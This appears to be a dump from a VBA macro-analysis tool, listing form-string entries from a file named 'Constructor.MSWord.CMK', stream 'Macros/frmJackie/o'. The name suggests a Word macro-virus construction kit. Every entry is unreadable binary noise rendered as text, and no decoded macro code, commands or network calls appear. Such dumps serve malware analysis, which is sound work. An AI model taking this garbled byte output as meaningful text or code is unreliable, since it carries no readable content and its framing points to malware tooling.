- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'#�V�d��g&"
Q��Y�3��T����H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�zk@ھ�Ҽ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y��$��|¥=*3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��C �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WBT⤱]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���̜?x�M�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�#��m�I�X:�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Mb;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k���h.�v�$��G{|�r��"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9؟�z��]15=&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ָ�5�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ϴ`n9�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ig�o,s�<R�q�p��L殢
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tt�j��?�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[i�5�A�(�jF�vAS�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����PWG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Qw��5+�!,
rvM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y${f�b�6P��0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�}�N1!Ē�>�Ш�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�<F�+Ǟ��PW�G?��w�8=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�	9�%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
㱬!���J�Q��2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݱڒ�,n5��n-���Q�lr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nk���5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��םj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sω!%'��Mw�KN�Dx���.h�+���.$��W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[<�;p}1Rki
��^�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��֯���Qu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��
�<#s��^C{p�sk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G��a�y{5�����#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(u�Lx���u�A�As�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cr��N����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ֆ���4���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��J7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zT����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���j[I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IN�ݷ�dx��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+KV�}Ջ[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�όH�,�)�G��,���#v�APk�M��i���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �c�W$S��S���-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��k�s�ڹ^���?Z�T�N�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ͼ��/ ~U�x�Nկo�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�[!�²�ǹ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���j�2Ȣ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]J�/.A�+rH|�q��y�vmov
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߛ�kx��g�q��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5[��� \H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��uh��/��l���0���5|�^����R��r7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�E��}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qڣ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۯ��5�*����~u��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qx�!o3��@�ך��&k�mi���jZsZ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{V��i�>1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ք~U{ǫ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�<cw8��\�￳�Ies�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V*5#%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�<e	�Y/ـ�B�àe9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�Ƶ��vW=|2��p2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�SH&}2�B-/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~ƴe���h;s��&���,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�NU�z(N.Vf��SP���5X��h4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{V.�q���:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�1�x��텍���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z���	n�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1��䚺��_��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�v�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\���^xsF���xb���+��%�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0��P8�y�d���ݝ�,�`:��Ԕ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dL�B�]I�f����]6��YGc(�eRH�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��1#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v6Zm�6x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cٳ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�t��<�cwI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?5>�UE=s[�s
u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�	&�9�H���i"��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z����^��:RL��5sGJbXcֻ_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p_Y~���2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]*UY9=�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��z��U�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�k߱�	.E'��g�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�_�qew�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T���W�=���~U���R�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�	6b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�ꈱ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�j�w��M�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
޹⼾
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VE?5n�k"-:x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Xʜ�Oc_×B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.8t[���J�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��HbOb}+�mL�!Q�ϭG6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tf9W����v���$��-#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��Wvv��&��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��j������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<Tot�,�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XTږ���)��#G��p+�c�H�cvC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hW� �5#�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c�}+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ߡ߄�{?u�K������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~5�m�]N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'��cqڱ�줰�x$R6�3U�,@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<=(�Es,F2���;X�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y/�*�"c����ɣ�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�Í5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!6K;n#�;T�8�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V���$W�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��0�j��G0��{&.�j�����f����໻�ˊ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~��ڴ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͉�o��O6IFv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E�̝��ؕ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p��kۖs�G
=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�}s���m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��MdW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ĩ����*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U�?-)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2��H�SH�zTr5;�D�&�Z�RV��Wd9S�Ny���14�*��ngk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&��
-------------------------------------------------------------------------------
